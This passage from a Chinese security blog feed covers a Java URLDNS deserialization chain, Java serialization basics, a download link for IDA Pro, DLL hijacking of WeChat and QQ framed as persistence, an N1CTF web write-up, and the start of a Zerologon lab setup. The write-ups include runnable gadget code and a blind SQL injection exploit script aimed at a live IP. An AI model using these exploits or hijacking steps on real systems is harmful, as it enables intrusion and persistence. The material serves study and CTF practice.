<p><code>setAccessible()</code> : 将目标类里的变量设置为允许修改状态</p>
<p><code>set()</code> : 对想要修改的变量值进行赋值</p>
<h2 id="0x02-了解前置知识后的urldns利用链构造">0x02 了解前置知识后的URLDNS利用链构造</h2>
<pre><code class="language-java">package com.company;

import java.util.HashMap;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;

public class  UrldnsDemo {

    public static void main(String[] args) throws Exception {
        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();
        URL url = new URL(&quot;http://y4dehg.dnslog.cn&quot;);
        url.hashCode();

    }
}
</code></pre>
<p>首先是要知道的是java.net.URL这个类，在创建对象后调用hashCode()方法是会调用getHostAddress()方法的，所以会请求一次域名，跟进的话ctrl/command+鼠标左键点击hashCode()然后在点击hashCode()就能看到getHostAddress了</p>
<figure data-type="image" tabindex="3"><img src="https://www.svenbeast.com/post-images/1609139798898.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://www.svenbeast.com/post-images/1609139837231.png" alt="" loading="lazy"></figure>
<p>而java.util.HashMap这个类重写了readObject方法(跟进头部代码import java.util.HashMap的HashMap即可获得源代码)，且设置为此readObject()方法在被反序列化时执行，最终在此方法的代码最下面执行了hash方法传入的参数是从反序列化字节码中得到的key</p>
<figure data-type="image" tabindex="5"><img src="https://www.svenbeast.com/post-images/1609139845213.png" alt="" loading="lazy"></figure>
<p><img src="https://www.svenbeast.com/post-images/1609139850530.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1610029748541.png" alt="" loading="lazy"></p>
<p>所以尝试写一下payload，看看能否反序列化时发出dns请求</p>
<pre><code class="language-java">Map hashMap = new HashMap();  //实例化hashMap类，利用的就是此类他重写的readObject方法，被反序列化时自动调用
URL url = new URL(&quot;http://dskg3c.dnslog.cn&quot;);  //实例化URL类，传入准备请求的域名，此对象用来当做key传入hashMap的
hashMap.put(url,&quot;test&quot;);  //写入到hashMap中，url为key，test为value，hashMap就是用来存储键值对的一个数据类型

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
oos.writeObject(hashMap);

ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
ois.readObject();
</code></pre>
<p>发现在反序列化时无法发出dns请求，后续在HashMap.java的1413行就是hash方法那里打断点跟进后面的代码才知道，就是因为下图显示，满足hashCode!=-1条件，没有执行902行真正的hashCode()方法</p>
<figure data-type="image" tabindex="6"><img src="https://www.svenbeast.com/post-images/1609140053169.png" alt="" loading="lazy"></figure>
<p>所以要更改hashCode变量的值就用到了java的反射，代码修改为</p>
<pre><code class="language-java">package com.company;

import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.util.HashMap;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Map;

public class  UrldnsDemo {

    public static void main(String[] args) throws Exception {

        Map hashMap = new HashMap();  //实例化hashMap类，利用的就是此类他重写的readObject方法，被反序列化时自动调用
        URL url = new URL(&quot;http://bqorej.dnslog.cn&quot;);  //实例化URL类，传入准备请求的域名，此对象用来当做key传入hashMap的

        Class clazz = Class.forName(&quot;java.net.URL&quot;); //获取想要反射的目标类的Class对象
        Field f = clazz.getDeclaredField(&quot;hashCode&quot;); //在存储的想要反射的目标类的clazz对象中的所有变量中获得hashCode变量存入f对象
        f.setAccessible(true); //设置hashCode变量为允许访问

        f.set(url,1); //锦上添花，加上这句就可以在下面这句put的时候让本地不发出dns请求，就跟文章前面的代码没有成功发出dns请求的原理一样，为了让hashCode!=-1 ,就随便赋个值
        hashMap.put(url,&quot;test&quot;);  //写入到hashMap中，url为key，test为value，hashMap就是用来存储键值对的一个数据类型
        f.set(url,-1); //修改的是URL类里的变量，所以传入url对象和要修改的值

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;));
        oos.writeObject(hashMap);

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;));
        ois.readObject();


//        Map m1 = new HashMap();
//        m1.put(&quot;Zara&quot;, &quot;8&quot;);
//        m1.put(&quot;Mahnaz&quot;, &quot;31&quot;);
//        m1.put(&quot;Ayan&quot;, &quot;12&quot;);
//        m1.put(&quot;Daisy&quot;, &quot;14&quot;);
//        System.out.println();
//        System.out.println(&quot; Map Elements&quot;);
//        System.out.print(&quot;\t&quot; + m1);

    }
}
</code></pre>
<p>这样就可以实现java在反序列化的时候发出了dns请求</p>
<figure data-type="image" tabindex="7"><img src="https://www.svenbeast.com/post-images/1609140072400.png" alt="" loading="lazy"></figure>
<p>PS：可能说的比较啰嗦，因为我是在理解URLDNS利用链前还得先去了解一些java的知识，一些也写到文章里了，其实就是硬啃o(╥﹏╥)o，后来理解了后觉得URLDNS这个链确实很简单，大部分时间还是在学习前置知识，也方便后续的其他链的学习啦</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Java序列化和反序列化]]></title>
        <id>https://www.svenbeast.com/post/java-xu-lie-hua-he-fan-xu-lie-hua/</id>
        <link href="https://www.svenbeast.com/post/java-xu-lie-hua-he-fan-xu-lie-hua/">
        </link>
        <updated>2020-12-16T15:33:01.000Z</updated>
        <content type="html"><![CDATA[<h2 id="科普时间">科普时间</h2>
<p><strong>对象</strong>：java实例化一个类的时候，可以称为一个对象，或者一个实例，比如下方的myPuppy （其他方法忽略）</p>
<pre><code class="language-java">Puppy myPuppy = new Puppy(&quot;tommy&quot;);
</code></pre>
<p><strong>抽象类</strong>：父类是将子类所共同拥有的属性和方法进行抽取，这些属性和方法中，有的是已经明确实现了的，有的还无法确定，那么我们就可以将其定义成抽象，在以后的子类中进行重用，进行具体化(就是继承父类的方法名，重新定义方法内容)</p>
<p><code>用abstract关键字来修饰抽象方法，用abstract来修饰抽象类</code></p>
<p><strong>抽象方法</strong>：在抽象类中的用abstract修饰的方法，只定义个方法名字，没有内容，方便子类继承这个类的时候具体将此方法内容定义出来</p>
<pre><code class="language-java">package javastudy;

public class AbstractDemo1 {

    public static void main(String[] args) {
        // TODO Auto-generated method stub

    }
}

// 这就是一个抽象类
abstract class Animal {
    String name;
    int age;

    // 动物会叫   这就是一个抽象方法
    public abstract void cry(); // 不确定动物怎么叫的。定义成抽象方法，来解决父类方法的不确定性。抽象方法在父类中不能实现，所以没有函数体。但在后续在继承时，要具体实现此方法。
}

// 抽象类可以被继承
// 当继承的父类是抽象类时，需要将抽象类中的所有抽象方法全部实现。
class cat extends Animal {
    // 实现父类的cry抽象方法
    public void cry() {
        System.out.println(&quot;猫叫:&quot;);

    }
}
</code></pre>
<p><strong>接口</strong>：是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p>
<pre><code class="language-java">//一个简单的接口
interface in1 {
	// 默认为 Public Static Final 
	final int a =10;
	
	// 默认为抽象方法 public and abstract
	void display();

}
</code></pre>
<p>继承接口的方式是使用implements去实现接口，当你为了实现接口写的类中实现了接口所有的方法，才算这个类实现接口成功：</p>
<pre><code class="language-java">class testClass implements in1 {
	// 实现接口中的方法
	public void display() {
		System.out.println(&quot;Study&quot;);
	}
}
</code></pre>
<p>写一个测试类，用来测试一下刚才实现的这个接口，因为testclass类的对象t实现了接口规定的display方法，那么自然而然就可以调用display()方法咯。</p>
<pre><code class="language-java">class testClass implements in1 {
	// 实现接口中的方法
	public void display() {
		System.out.println(&quot;Study&quot;);
	}
	
	public static void main (String[] args) {
		testClass t = new testClass();
		t.display();
		System.out.println(a);
	}
}
</code></pre>
<h2 id="概念">概念</h2>
<ul>
<li>
<p>序列化：把对象转换为字节序列的过程称为对象的序列化。</p>
</li>
<li>
<p>反序列化：把字节序列恢复为对象的过程称为对象的反序列化。</p>
</li>
</ul>
<p>在Java中，我们可以通过多种方式来创建对象，并且只要对象没有被回收我们都可以复用此对象。但是，我们创建出来的这些对象都存在于JVM中的堆（heap）内存中，只有JVM处于运行状态的时候，这些对象才可能存在。一旦JVM停止，这些对象也就随之消失，但是在真实的应用场景中，我们需要将这些对象持久化下来，并且在需要的时候将对象重新读取出来，Java的序列化和反序列化可以帮助我们实现该功能。</p>
<p>主要两种用途：</p>
<p>1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；</p>
<p>2） 在网络上传送对象的字节序列。</p>
<p>最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些session先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。</p>
<h2 id="相关接口及类">相关接口及类</h2>
<p>Java为了方便开发人员将java对象序列化及反序列化提供了一套方便的API来支持，其中包括以下接口和类</p>
<pre><code class="language-java">java.io.Serializable   //接口1

java.io.Externalizable  //接口2

ObjectOutput

ObjectInput

ObjectOutputStream

ObjectInputStream
</code></pre>
<h2 id="demo">Demo</h2>
<ul>
<li>
<p>使用Java.io.Serializable对类的序列化和反序列化</p>
<pre><code class="language-java">package com.company;

import java.io.*;

public class SerializableDemo1 {

    //建立User类实现java提供的Serializable接口
    public static class User implements Serializable {
        private String userName;


        public void setName(String userName) {
            this.userName = userName;
        }

        public String getName() {
            return userName;
        }


    }
    //序列化demo
    public static void main(String[] args) throws Exception, IOException {

        //初始化对象
        User resOld = new User();    //要序列化的对象
        resOld.setName(&quot;awsl&quot;);
        System.out.println(&quot;序列化前:&quot; + resOld.getName());   //首尾呼应~

        //序列化对象到文件中
        FileOutputStream  creatFile = new FileOutputStream(&quot;ser&quot;);   //创建ser文件
        ObjectOutputStream serResult = new ObjectOutputStream(creatFile);
        serResult.writeObject(resOld);  //将序列化后的字节写入文件
        serResult.close();

        //反序列化
        FileInputStream readFile = new FileInputStream(&quot;ser&quot;);  //读取ser文件
        ObjectInputStream unserFile = new ObjectInputStream(readFile);  //读取序列化后的字节
        User resNew = (User) unserFile.readObject();    //反序列化还原对象
        unserFile.close();

        System.out.println(&quot;序列化后:&quot; + resNew.getName());  //首尾呼应~
    }

}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1608132960801.png" alt="" loading="lazy"></figure>
</li>
<li>
<p>使用java.io.Externalizable对类的序列化和反序列化</p>
<pre><code class="language-java">package com.company;

import java.io.*;

public class SerializableDemo2 {

    //建立Study类实现java提供的Externalizable接口
    public static class Study implements Externalizable {
        private String  myName;

        public void setName(String argsName){
            this.myName = argsName;
        }

        public String getName() {
            return this.myName;
        }

        @Override  //使用Externalizable接口会强制生成此类
        public void writeExternal(ObjectOutput out) throws IOException {
            out.writeObject(myName);   //不这样会导致序列化后，变量的值被清空
        }

        @Override  //使用Externalizable接口会强制生成此类
        public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {
            myName = (String)in.readObject(); //不这样会导致序列化后，变量的值被清空
        }
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        //初始化参数
        Study resOld = new Study();
        resOld.setName(&quot;xmsl&quot;);
        System.out.println(&quot;序列化前:&quot; + resOld.getName());  //首尾呼应

        //创建用来存储序列化字节码的文件
        FileOutputStream creatFile = new FileOutputStream(&quot;ser2&quot;);

        //序列化
        ObjectOutputStream serResult = new ObjectOutputStream(creatFile);
        serResult.writeObject(resOld);
        serResult.close();
        //读取刚才用来存储序列化字节码的文件
        FileInputStream readFile = new FileInputStream(&quot;ser2&quot;);

        //反序列化
        ObjectInputStream unserResult = new ObjectInputStream(readFile);
        Study resNew = (Study) unserResult.readObject();
        unserResult.close();
        System.out.println(&quot;序列化后:&quot; + resNew.getName());  //首尾呼应
    }
  
}

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://www.svenbeast.com/post-images/1608133052564.png" alt="" loading="lazy"></figure>
</li>
</ul>
<h3 id="其他">其他</h3>
<ul>
<li>
<p>序列化保存的是对象的状态</p>
</li>
<li>
<p>静态变量属于类的状态，因此 序列化并不保存静态变量</p>
</li>
<li>
<p>使用<strong>transient</strong>修饰不想被序列化的变量，在变量声明前加上该关键字，可以阻止该变量被序列化到文件中，在被反序列化后，transient 变量的值被设为初始值，如 int 型的是 0，对象型的是 null。</p>
<pre><code class="language-java">public transient int youAge;
</code></pre>
</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Windows IDA PRO 7.5 (x86, x64, ARM, ARM64)]]></title>
        <id>https://www.svenbeast.com/post/windows-ida-pro-75-x86-x64-arm-arm64/</id>
        <link href="https://www.svenbeast.com/post/windows-ida-pro-75-x86-x64-arm-arm64/">
        </link>
        <updated>2020-12-16T02:20:18.000Z</updated>
        <content type="html"><![CDATA[<p>忽然就整个世界都有了7.5的IDA，可惜没有mac版，o(╥﹏╥)o<br>
下载备份分享一下<br>
百度云: https://pan.baidu.com/s/1R61Y9QrVi-gQQEw5kP2O1g  密码: pmd4<br>
Mega：https://mega.nz/file/mwokCDzQ#TYGiRVS9JZhHJxNOxWmHwzVsBXSCZIfXXXF9TMiPe7o</p>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1608085613118.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DLL劫持及尝试对微信和QQ的劫持]]></title>
        <id>https://www.svenbeast.com/post/dll-jie-chi/</id>
        <link href="https://www.svenbeast.com/post/dll-jie-chi/">
        </link>
        <updated>2020-11-08T09:11:36.000Z</updated>
        <content type="html"><![CDATA[<p><strong>DLL劫持可用于<code>权限维持</code>、权限提升、进程注入，属于经久不衰的必备技能</strong></p>
<h2 id="0x01-dll介绍">0x01 DLL介绍</h2>
<pre><code>DLL是Dynamic Link Library的缩写，叫做动态链接库
一个dll文件可以由多个程序同时调用
dll的使用意义是某个大型程序在启动时和启动后，可以不加载某部分功能代码，只有用户使用时
再去调用对应功能的dll模块，从而达到减少软件启动速度的目的
</code></pre>
<h2 id="0x02-dll劫持前置知识点">0x02 DLL劫持前置知识点</h2>
<p>劫持的方法了解到的有两种，在之前要先知道一下exe程序加载dll的知识点</p>
<p><strong>exe程序在调用dll时，查找dll文件的目录优先级顺序</strong></p>
<ul>
<li>1.程序所在目录</li>
<li>2.程序加载目录（SetCurrentDirectory）</li>
<li>3.系统目录即 SYSTEM32 目录</li>
<li>4.16位系统目录即 SYSTEM 目录</li>
<li>5.Windows目录</li>
<li>6.PATH环境变量中列出的目录</li>
</ul>
<p><strong>在win7及以上系统对应dll的一个安全机制--KnownDLLs</strong></p>
<p><code>KnownDLLs</code>是一个注册表的名称，如果有exe程序调用的dll名称存在于此目录下，那么这个DLL会被禁止从EXE自身所在目录下调用，而只能从系统目录即SYSTEM32目录下调用</p>
<pre><code>注册表位置：\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1605001830164.png" alt="" loading="lazy"></figure>
<h2 id="0x03-dll劫持">0x03 DLL劫持</h2>
<ul>
<li>
<ol>
<li>劫持EXE应用调用的缺少的DLL(exe发出请求，在某个路径寻找对应的dll，结果对应路径不存在此dll)</li>
</ol>
</li>
<li>
<ol start="2">
<li>劫持EXE应用正常调用的DLL(类似端口转发，使用一个恶意dll冒充原先dll，执行完恶意代码后在将请求转发到原先dll，不影响应用正常使用)</li>
</ol>
</li>
</ul>
<p><strong>使用第一种方法劫持微信</strong></p>
<ul>
<li>首先要找到wechat.exe发出请求后加载dll的结果为NOT FOUND的，我这里使用辅助工具<code>Process Monitor</code>（一款系统进程监视软件），然后再一一验证可行性</li>
</ul>
<pre><code>打开Process Monitor
 ↓
打开微信
 ↓
设置Process Monitor的过滤器，添加wechat.exe进程的PID将显示的其他进程过
滤掉，再添加其他一些过滤规则(见下图)
 ↓
保存结果为csv文件，目的为了用execl里的筛选，将EXE程序加载的dll单独列出来
 ↓
正常是将恶意dll改成加载的不在KnownDLLs注册表中的dll名称，放在EXE应用同目录，这里使用anhkgg师傅的批量检验，可以帮助我自动重命名文件然后执行验证的一些自动化操作
 ↓
找到目标，将恶意dll改名放入wechat.exe同目录(因为加载顺序同目录优先级最高，当然其他地方也可以)
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1604852818598.png" alt="" loading="lazy"><br>
↓<br>
<img src="https://www.svenbeast.com/post-images/1604852843698.png" alt="" loading="lazy"><br>
↓<br>
<img src="https://www.svenbeast.com/post-images/1604849478939.png" alt="" loading="lazy"><br>
↓<br>
<code>gif效果图</code><br>
<img src="https://www.svenbeast.com/post-images/1604852194936.gif" alt="" loading="lazy"></p>
<p><strong>使用第二种方法劫持QQ</strong></p>
<ul>
<li>首先找到一个EXE程序加载的dll，两个硬性要求（一是exe确实加载了此dll，二是此dll不在KnownDLLs注册表中，不过既然在同目录下找到的加载dll，那肯定不在KnownDLLs里），用来中间人转发他也就是劫持，一般找小点的，小点的需要转发函数的数量会少点，查阅一些文章总算找到一个自动化的工具 <code>dll-hijacking</code> ，这样我就不用手动复制函数了</li>
</ul>
<pre><code>在QQ.exe同目录寻找目标dll
 ↓
复制目标dll到dll-hijacking工具下进行加工
 ↓
处理好的恶意dll改好原本的名字复制到QQ.exe目录下，将刚才复制的此
目录原本的dll名字改为 原名字_.dll(这样此目录就有    原名字.dll  原名字_.dll)
 ↓
启动QQ, over了
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1604915226765.png" alt="" loading="lazy"><br>
↓<br>
<img src="https://www.svenbeast.com/post-images/1604915878729.png" alt="" loading="lazy"><br>
↓<br>
<img src="https://www.svenbeast.com/post-images/1604916036044.png" alt="" loading="lazy"><br>
↓<br>
<code>gif效果图</code><br>
<img src="https://www.svenbeast.com/post-images/1604916472354.gif" alt="" loading="lazy"></p>
<ul>
<li>dllmain.cpp弹框代码</li>
</ul>
<pre><code>/*
https://itm4n.github.io/dll-proxying/
https://www.codeproject.com/Articles/17863/Using-Pragmas-to-Create-a-Proxy-DLL
to implement: hooking specific functions
*/



#include &quot;definitions.h&quot;
#include &lt;thread&gt;
#include &lt;chrono&gt;
#include &lt;random&gt;
extern &quot;C&quot;{
    #include   &lt;stdlib.h&gt;
    #include   &lt;winsock2.h&gt;
    #include      &lt;stdio.h&gt;
    #include     &lt;windows.h&gt;
    #include      &lt;ws2tcpip.h&gt;
}

using namespace   std;
#pragma comment(lib,&quot;Ws2_32.lib&quot;)

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,   // handle to DLL module
    DWORD fdwReason,    // reason for calling function
    LPVOID lpReserved) // reserved
{
    srand(time(NULL));
    switch (fdwReason)
    {
    case  DLL_PROCESS_ATTACH:
    {
        MessageBox(NULL, &quot;Success&quot;, &quot;&quot;, MB_OK);
        break;
    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    default:
        break;
    }

    return true;

}
</code></pre>
<h2 id="0x04-参考链接">0x04 参考链接</h2>
<pre><code>https://payloads.online/archivers/2018-12-22/1
https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&amp;mid=2247483851&amp;idx=1&amp;sn=8813719d4d3ac8b20bec495fcd5f2974&amp;chksm=fcb7834ecbc00a58da8a6408abe183e71175b442d0f02016ad3c67c9cf719927881bec14af49#rd
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[{N1CTF·2020·web·SignIn·writeup}]]></title>
        <id>https://www.svenbeast.com/post/n1ctf2020websigninwriteup/</id>
        <link href="https://www.svenbeast.com/post/n1ctf2020websigninwriteup/">
        </link>
        <updated>2020-10-19T06:44:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="开始">开始</h3>
<p>访问地址直接给出了源码:  http://101.32.205.189</p>
<pre><code>&lt;?php 
class ip {
    public $ip;
    public function waf($info){
    }
    public function __construct() {
        if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $this-&gt;ip = $this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']);
        }else{
            $this-&gt;ip =$_SERVER[&quot;REMOTE_ADDR&quot;];
        }
    }
    public function __toString(){
        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return &quot;your ip looks ok!&quot;;
        }
        mysqli_close($con);
    }
}

class flag {
    public $ip;
    public $check;
    public function __construct($ip) {
        $this-&gt;ip = $ip;
    }
    public function getflag(){
    	if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
    		readfile('/flag');
    	}
        return $this-&gt;ip;
    }
    public function __wakeup(){
        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
        else
            $this-&gt;ip = &quot;noip&quot;;
    }
    public function __destruct() {
        echo $this-&gt;getflag();
    }

}
if(isset($_GET['input'])){
    $input = $_GET['input'];
	unserialize($input);
} 
</code></pre>
<p>粗略一看，源码里<code>unserialize($input)</code>的大字告诉我们是需要控制传入input参数的反序列化数据来进行一些条件的满足从而来获得flag</p>
<pre><code>    public function getflag(){
    	if(md5($this-&gt;check)===md5(&quot;key****************&quot;)){
    		readfile('/flag');
    	}
        return $this-&gt;ip;
    }
</code></pre>
<p>最终达成的目的很明显就是运行flag类里的<code>getflag()</code>方法，通过readfile来获得flag文件，而想要运行此方法就要满足条件<code>md5($this-&gt;check)===md5(&quot;key****************&quot;)</code>，并且key我们是不知道的，看起来也没有办法控制，可以控制的话还可以通过传入数组让两边md5函数来返回null来进行条件满足，所以我们<code>需要知道这个key的值</code></p>
<pre><code>    public function __toString(){
        $con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;********&quot;,&quot;n1ctf_websign&quot;);
        $sqlquery=sprintf(&quot;INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')&quot;,$this-&gt;waf($_SERVER['HTTP_X_FORWARDED_FOR']),time());
        if(!mysqli_query($con,$sqlquery)){
            return mysqli_error($con);
        }else{
            return &quot;your ip looks ok!&quot;;
        }
        mysqli_close($con);
    }
</code></pre>
<p>然后很自然的将目光投放到上面的ip类中，看到此类获取了访问者XFF并插入表中，很自然的就想到了<code>xff注入</code>，通过注入来获得key，来赋值<code>flag类中的check变量</code>，而此mysql语句放在<code>__toString()</code>中，想要运行此函数就要满足一个对象被当做字符串对待来触发,所以我们<code>需要寻找一个能够触发__toString()的点</code></p>
<pre><code>    public function __wakeup(){
        if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)
            $this-&gt;ip = &quot;welcome to n1ctf2020&quot;;
        else
            $this-&gt;ip = &quot;noip&quot;;
    }
</code></pre>
<p>分析一下发现，我们传入反序列化数据会触发<code>__wakeup()</code>,此处的<code>stristr()函数是对传入参数1中查找是否存在参数2</code>,而参数1也就是<code>$this-&gt;ip</code>是我们实例化flag时传入的字符串，属于可控参数，而当我们传入的是ip类实例化后的对象时，则刚好触发此ip类的__toString()函数，所以我们此时可以<code>生成序列化数据进行尝试</code></p>
<pre><code>$flags = new flag(new ip());
$b = serialize($flags);
echo $b;
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://www.svenbeast.com/post-images/1603092883974.png" alt="" loading="lazy"></figure>
<pre><code>INSERT into admin(`username`,`password`) VALUES ('user' and updatexml(1,concat(0x02,(select database()),0x02),1) and '','123456')
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1603098143275.png" alt="" loading="lazy"><br>
然后在本地mysql尝试构造了一个insert注入payload: <code>INSERT into admin(<code>username</code>,<code>password</code>) VALUES ('user' or if(1=1,sleep(3),1) or '','123456')</code>本地运行成功，访问目标时提示如图<br>
<img src="https://www.svenbeast.com/post-images/1603098231154.png" alt="" loading="lazy"><br>
存在注入检测，应该就是waf函数没显示的那些代码，所以无法直接进行注入，需要另想办法，而<code>__wakeup()</code>函数中有一个可以帮助盲注的点，触发__toString()时，我们可以通过报错函数来控制返回的字符串是否存在n1ctf，所以构造注入语句<code>1.1.1.1' or updatexml(1,concat(0x01,(select if((1=1),'n1ctf','no str')),0x01),1) or '</code><br>
<img src="https://www.svenbeast.com/post-images/1603099096481.png" alt="" loading="lazy"><br>
提示了welcome to n1ctf2020，那么只有在传入的值中包含n1ctf才会提示这个，所以很明显是传入的对象成功触发toString函数，证明思路是正确的，其中的报错函数导致sql语句报错，使return的返回值中包含了n1ctf，根据这个逻辑去写一个python脚本跑一下,我这里使用了一个很实用的burpsuite的插件辅助生成个模板<br>
<img src="https://www.svenbeast.com/post-images/1603099255763.png" alt="" loading="lazy"></p>
<h3 id="exp"><strong>exp</strong></h3>
<pre><code>import requests

session = requests.Session()

x = 'qwertyuiopasdfghjklzxcvbnm1234567890'

arr = []
paramsGet = {&quot;input&quot;:&quot;O:4:\&quot;flag\&quot;:2:{s:2:\&quot;ip\&quot;;O:2:\&quot;ip\&quot;:1:{s:2:\&quot;ip\&quot;;s:9:\&quot;127.0.0.1\&quot;;}s:5:\&quot;check\&quot;;N;}&quot;}
for start in range(1,30):
    for result in x:
        #获得表名为n1key
        # get_tables = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(table_name) from  information_schema.tables where table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
        #获得列名
        # get_column = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(column_name) from information_schema.columns where table_name='n1key' and table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
        #获得key值
        get_key = &quot;' or updatexml(1,concat(0x02,(select if((substring((select `key` from n1key),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result)
        
        headers = {&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;X-Forwarded-for&quot;:&quot;1.1.1.1{}&quot;.format(get_key),&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,ar;q=0.8&quot;}
        response = session.get(&quot;http://101.32.205.189/index.php&quot;, params=paramsGet, headers=headers)

        if '&lt;code&gt;noip&lt;/code&gt;' not in str(response.content):
            print('tables:'+result)
            arr.append(result)
for res in arr:
    print(res,end=&quot;&quot;)
</code></pre>
<p><img src="https://www.svenbeast.com/post-images/1603101199981.png" alt="" loading="lazy"><br>
获得了表名为n1ip, n1key，这里是因为源码里有数据库名为n1ctf_websign，所以可直接跑出表名<br>
<img src="https://www.svenbeast.com/post-images/1603101738162.png" alt="" loading="lazy"><br>
获得列名为id,key<br>
<img src="https://www.svenbeast.com/post-images/1603102665903.png" alt="" loading="lazy"><br>
获得key为n1ctf20205bf75ab0a30dfc0c<br>
<img src="https://www.svenbeast.com/post-images/1603102892602.png" alt="" loading="lazy"><br>
<img src="https://www.svenbeast.com/post-images/1603102783683.png" alt="" loading="lazy"><br>
然后用这个key生成序列化数据进行访问，得到flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CVE-2020-1472 NetLogon 特权提升漏洞 ]]></title>
        <id>https://www.svenbeast.com/post/fu-xian-cve-2020-1472-netlogon-te-quan-ti-sheng-lou-dong/</id>
        <link href="https://www.svenbeast.com/post/fu-xian-cve-2020-1472-netlogon-te-quan-ti-sheng-lou-dong/">
        </link>
        <updated>2020-09-17T15:07:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="0x01-漏洞详情">0x01 漏洞详情</h3>
<pre><code>NetLogon组件 是 Windows 上一项重要的功能组件，用于用户和机器在域内网络上的认证，以及复制数据库以进行域控备份，同时还用于维护域成员与域之间、域与域控之间、域DC与跨域DC之间的关系。

当攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的易受攻击的 Netlogon 安全通道时，存在特权提升漏洞。成功利用此漏洞的攻击者可以在网络中的设备上运行经特殊设计的应用程序。
</code></pre>
<h3 id="0x02-影响版本">0x02 影响版本</h3>
<pre><code>Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)
</code></pre>
<h3 id="0x03-域环境搭建">0x03 域环境搭建</h3>
<pre><code>靶机环境：https://pan.baidu.com/s/13nU-0vsGBnGejGCKzwphfQ&amp;shfl=sharepset     
提取码：41y6

DC  
windows server 2012
单网卡
IP: 10.10.10.10  
网关: 10.10.10.1

PC
windows 7
双网卡
IP: 10.10.10.201
网关: 10.10.10.1
IP: 172.21.139.173
网关: 172.21.139.1

WEB
windows 2008
双网卡
IP:  10.10.10.80
网关:  10.10.10.1
IP:  172.21.139.41
网关:  172.21.139.1

